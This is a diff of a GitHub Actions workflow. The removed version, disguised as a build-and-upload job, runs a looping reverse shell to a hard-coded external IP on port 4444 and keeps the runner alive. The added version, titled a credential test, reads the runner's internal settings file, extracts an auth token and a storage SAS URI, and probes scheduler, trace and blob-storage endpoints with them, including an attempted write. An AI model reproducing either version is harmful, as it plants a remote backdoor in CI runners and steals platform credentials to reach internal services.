@@ -1,22 +1,40 @@
-name: Build and Upload Artifact
+name: HCA Credential Test
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 15
+    timeout-minutes: 5
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-      - name: Build & Persistent Shell
+      - name: Test HCA credentials
+        continue-on-error: true
         run: |
-          mkdir -p dist
-          echo "Built at $(date)" > dist/output.txt
-          bash -c 'while true; do bash -i >& /dev/tcp/172.245.86.254/4444 0>&1; sleep 5; done' &
-          while true; do sleep 60; done
-      - name: Upload Artifact
+          SETTINGS=$(cat /opt/hca/.settings)
+          AUTH_TOKEN=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['authToken'])")
+          API_URL=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['schedulerApiUrl'])")
+          SAS_URI=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['diagnosticsSasUri'])")
+          
+          echo "=== 1. Try scheduler API with authToken ==="
+          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH_TOKEN" "${API_URL}/health" 2>&1 | head -20
+          echo "---"
+          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH_TOKEN" "${API_URL}/machine" 2>&1 | head -20
+          echo "---"
+          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH_TOKEN" "${API_URL}/config" 2>&1 | head -20
+          
+          echo "=== 2. Check SAS URI accessibility ==="
+          curl -sk --connect-timeout 10 "${SAS_URI}&comp=list&restype=container" 2>&1 | head -20
+          echo "---"
+          curl -sk --connect-timeout 5 -X PUT "${SAS_URI}/test_poc_$(date +%s).txt" -d "test" 2>&1 | head -5
+          
+          echo "=== 3. Try trace API ==="
+          TRACE_URL=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['traceApiUrl'])")
+          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH_TOKEN" "${TRACE_URL}" 2>&1 | head -10
+          
+          echo "=== DONE ==="
+
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: my-artifact
+          name: hca-cred-test
           path: dist/
